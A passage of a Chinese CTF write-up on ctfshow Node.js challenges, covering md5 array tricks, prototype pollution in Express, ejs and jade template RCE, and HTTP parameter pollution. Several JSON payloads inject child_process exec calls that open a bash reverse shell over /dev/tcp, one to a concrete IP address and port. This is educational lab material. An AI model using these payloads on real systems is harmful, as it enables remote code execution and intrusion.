class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag); <span class="comment">// 要求：a、b有内容，且a、b长度一致，且a、b不等，且a、b加上flag字符串的md5值要一样</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+
+<p>看<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/131575506">wp</a>,提到nodejs的拼接特性：</p>
+<h3 id="nodejs-拼接"><a href="#nodejs-拼接" class="headerlink" title="nodejs 拼接"></a>nodejs 拼接</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure>
+
+<p>得到payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a[:]=2&amp;b[:]=2</span><br><span class="line">或者</span><br><span class="line">?a[a]=2&amp;b[b]=2</span><br></pre></td></tr></table></figure>
+<p>在这里内部不能用括号。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45696568/article/details/116880004">因为：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125;</span><br><span class="line"></span><br><span class="line">console.log(a+&quot;flag&#123;xxx&#125;&quot;)</span><br><span class="line">console.log(b+&quot;flag&#123;xxx&#125;&quot;)</span><br><span class="line">二者得出的结果都是[object Object]flag&#123;xxx&#125;，所以md5值也相同</span><br><span class="line"></span><br><span class="line">但是如果传a[0]=1&amp;b[0]=2，相当于创了个变量a=[1] b=[2]，再像上面那样打印的时候，会打印出1flag&#123;xxx&#125;和2flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web338-原型链污染-express框架"><a href="#web338-原型链污染-express框架" class="headerlink" title="web338 原型链污染 express框架"></a>web338 原型链污染 express框架</h2><p>源码 login.js:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>common.js:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="nodejs-原型链污染"><a href="#nodejs-原型链污染" class="headerlink" title="nodejs 原型链污染"></a>nodejs 原型链污染</h3><blockquote>
+<p>Node.js 中的原型链污染是一种安全漏洞，可以被恶意利用来修改目标对象的原型，从而影响目标对象的行为。这种漏洞通常发生在未正确验证用户输入的情况下，导致恶意用户能够修改目标对象的原型，从而执行恶意代码或者获取敏感信息。</p>
+</blockquote>
+<blockquote>
+<p>在 JavaScript 中，每个对象都有一个原型（prototype），它是一个指向另一个对象或 null 的内部链接。当我们访问一个对象的属性或方法时，如果该对象本身没有这个属性或方法，JavaScript 引擎会沿着原型链向上查找，直到找到匹配的属性或方法，或者到达原型链的末端（即原型为 null）为止。</p>
+</blockquote>
+<blockquote>
+<p>在 Node.js 中，原型和原型链的概念与浏览器中的 JavaScript 相同。Node.js 本质上是基于 V8 引擎的 JavaScript 运行环境，因此继承了 JavaScript 的原型继承机制。Node.js 的原型链是由 JavaScript 引擎实现的，用于继承对象的属性和方法，实现了对象之间的原型继承关系。例如，Node.js 中的 Buffer 对象就是通过原型链继承了 Uint8Array 对象的方法和属性。</p>
+</blockquote>
+<blockquote>
+<p><code>__proto__</code> 是每个 JavaScript 对象都具有的属性，它指向该对象的原型（prototype）。通过 <code>__proto__</code> 属性，可以访问和操作对象的原型链。虽然 <code>__proto__</code> 在早期的 JavaScript 规范中被称为内部属性，不建议直接使用，但在实际开发中它仍然被广泛使用。</p>
+</blockquote>
+<blockquote>
+<p>在现代 JavaScript 中，推荐使用 Object.getPrototypeOf() 和 Object.setPrototypeOf() 方法来访问和设置对象的原型，而不是直接使用 <code>__proto__</code> 属性。这是因为 <code>__proto__</code> 属性在一些 JavaScript 引擎中可能会被优化或实现不同，可能会导致不确定的行为。因此，为了代码的可靠性和可读性，最好使用标准的方法来操作对象的原型链。</p>
+</blockquote>
+<p>在这道题中，<code>secert.ctfshow</code>是不存在的。所以会沿着原型链向上查找，直到找到匹配的属性或方法。这里抓包改包。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;ctfshow&quot;</span><span class="punctuation">:</span><span class="string">&quot;36dboy&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>让<code>user</code>的原型<code>__proto__</code>有了属性。</p>
+<blockquote>
+<p>在 JavaScript 中，<code>__proto__</code> 属性是用来访问和设置对象的原型的。当你将 <code>__proto__</code> 设置为一个包含键值对的对象时，这些键值对会被添加到对象的原型链中，而不是直接添加到对象本身。这意味着，如果你设置了 <code>__proto__</code> 属性为 <code>&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;</code>，并且尝试访问对象的 <code>ctfshow</code> 属性，JavaScript 引擎会沿着原型链向上查找，直到找到 <code>ctfshow</code> 属性为止。</p>
+</blockquote>
+<blockquote>
+<p>在这种情况下，<code>__proto__</code> 属性会让原型链上多出一个属性，即对象的原型对象（<code>Object.prototype</code>）上的 <code>ctfshow</code> 属性。这意味着，如果对象本身没有 <code>ctfshow</code> 属性，但是它的原型链上有一个 <code>ctfshow</code> 属性，那么你仍然可以通过对象来访问这个属性。</p>
+</blockquote>
+<p>学习链接：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解JavaScript原型链污染</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</span><br><span class="line"></span><br><span class="line">- 每个构造函数(`constructor`)都有一个原型对象(`prototype`)</span><br><span class="line">- 对象的`__proto__`属性，指向类的原型对象`prototype`</span><br><span class="line">- `JavaScript`使用`prototype`链实现继承机制</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="web339-原型链污染-RCE和反弹shell"><a href="#web339-原型链污染-RCE和反弹shell" class="headerlink" title="web339 原型链污染 RCE和反弹shell"></a>web339 原型链污染 RCE和反弹shell</h2><p>这道题相比上题加入了一个<code>api.js</code>:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>); <span class="comment">// 设置响应的 Content-Type 头部为 text/html，表示响应的内容类型为 HTML。</span></span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;); <span class="comment">// 渲染名为 &#x27;api&#x27; 的视图模板，并将一个包含 query 属性的对象传递给模板。其中，query 属性的值是通过将 query 字符串作为函数执行后的结果。</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/122567506">wp</a>,漏洞点是<code>Function</code>里的<code>query</code>变量没有被引用，从而可以通过原型链污染进行rce。</p>
+<p>一旦进行了原型链污染，所有的对象都会被影响。所以这道题如果做错了需要重启环境，做错了很多次，非常头痛。</p>
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps_ip/vps_port 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>使用了<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec()</code>，实际上和<code>require(&#39;child_process&#39;).exec()</code>是一个函数。</p>
+<p>先将payload POST至<code>/login</code>，然后POST<code>/api</code>即可命令执行。因为回显只能显示一次，所以这里反弹shell。</p>
+<h2 id="web340-原型链污染-向上污染两级"><a href="#web340-原型链污染-向上污染两级" class="headerlink" title="web340 原型链污染 向上污染两级"></a>web340 原型链污染 向上污染两级</h2><p>login.js改成这样了：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里是<code>copy</code>到了<code>user.userinfo</code>，而不是直接<code>copy</code>到<code>user</code>里，从而像上一题的payload那样造成<code>user.query</code>的RCE。</p>
+<p>这题需要向上污染两级：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps_ip/vps_port 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就能污染到<code>query</code>了。</p>
+<h2 id="web341-ejs漏洞rce"><a href="#web341-ejs漏洞rce" class="headerlink" title="web341 ejs漏洞rce"></a>web341 ejs漏洞rce</h2><p>app.js中有：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">和</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>).<span class="property">__express</span>); </span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236354">ejs和jade模板RCE</a></p>
+<p>学习了一番，出现了类似原型链污染+命令拼接的漏洞。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="comment">// After injection</span></span><br><span class="line">prepended += <span class="string">&#x27; var __tmp1; return global.process.mainModule.constructor._load(&#x27;</span>child_process<span class="string">&#x27;).execSync(&#x27;</span>dir<span class="string">&#x27;); __tmp2 = __append;&#x27;</span></span><br><span class="line"><span class="comment">// 拼接了命令语句</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就能构造这样的payload，跟上道题一样，也是要污染两层。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps_ip/vps_port 0&gt;&amp;1 \&quot;&#x27;); __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web342-jade漏洞rce"><a href="#web342-jade漏洞rce" class="headerlink" title="web342 jade漏洞rce"></a>web342 jade漏洞rce</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025?time__1311=n4+xnD0GDti=/q053bDyCDgj7CG=DRGYD">ejs和jade模板RCE</a></p>
+<p>继续学习了一番，然后直接网上偷了个payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Code&quot;</span><span class="punctuation">,</span><span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span><span class="string">&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/82.156.125.203/9999 0&gt;&amp;1\&quot;&#x27;);//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web343-jade漏洞rce"><a href="#web343-jade漏洞rce" class="headerlink" title="web343 jade漏洞rce"></a>web343 jade漏洞rce</h2><p>看<a target="_blank" rel="noopener" href="https://hextuff.dev/2022/06/09/ctfshow-web-getting-started-nodejs/#web341">wp</a>说是跟上题差不多，就没写</p>
+<h2 id="web344-HPP"><a href="#web344-HPP" class="headerlink" title="web344 HPP"></a>web344 HPP</h2><p>给了源码提示：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123; <span class="comment">//忽略大小写+全局匹配</span></span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>尝试简单的使用<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>，发现不行，因为正则匹配了逗号，%2c也是逗号。</p>
+<h3 id="HPP（HTTP-Parameter-Pollution）：-HPP数据污染"><a href="#HPP（HTTP-Parameter-Pollution）：-HPP数据污染" class="headerlink" title="HPP（HTTP Parameter Pollution）： HPP数据污染"></a>HPP（HTTP Parameter Pollution）： HPP数据污染</h3><blockquote>
+<p>HPP（HTTP Parameter Pollution）是一种攻击方式，通过在 HTTP 请求中重复传递相同的参数名，或者传递一个参数名对应多个数值的方式，来欺骗服务器，从而导致服务器解析请求参数时出现错误，可能导致安全漏洞。</p>
+</blockquote>
+<blockquote>
+<p>HPP 攻击的目的通常是绕过服务器端对参数的验证或过滤，达到执行未授权操作、绕过访问控制、篡改数据等攻击目的。攻击者可以通过修改请求中的参数顺序或值，混淆服务器端对参数的处理，导致服务器误解请求，从而执行恶意操作。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://tari.moe/2021/ctfshow-nodejs.html#13e0f1829657424ebd9180d4d6f85ce8">wp</a></p>
+<blockquote>
+<p><strong>nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析。</strong><br>双引号的url编码是 <code>%22</code>，和 <code>c</code> 连接起来就是 <code>%22c</code>，会匹配到正则表达式。</p>
+</blockquote>
+<p>构造payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span>&amp;query=<span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;%63tfshow&quot;</span>&amp;query=<span class="attr">&quot;isVIP&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="动态调试验证HPP"><a href="#动态调试验证HPP" class="headerlink" title="动态调试验证HPP"></a>动态调试验证HPP</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./index&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">    <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">port = <span class="number">3000</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, router);</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App is running on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>打断点看，在获取到get参数后，<code>req.query.query</code>确实如上面，变成了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>(<span class="number">3</span>) [&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>,</span><br><span class="line"><span class="string">&quot;isVIP&quot;</span>:<span class="literal">true</span>&#125;]</span><br></pre></td></tr></table></figure>
+<p>该数组被<code>JSON.parse()</code>后，就变成了一个对象。</p>
+<blockquote>
+<p>JSON.parse 会将参数转为 string，[“str1”, “str2”].toString() &#x3D;&#x3D;&#x3D; “str1,str2” 于是可以绕过 ,(2c)。</p>
+</blockquote>
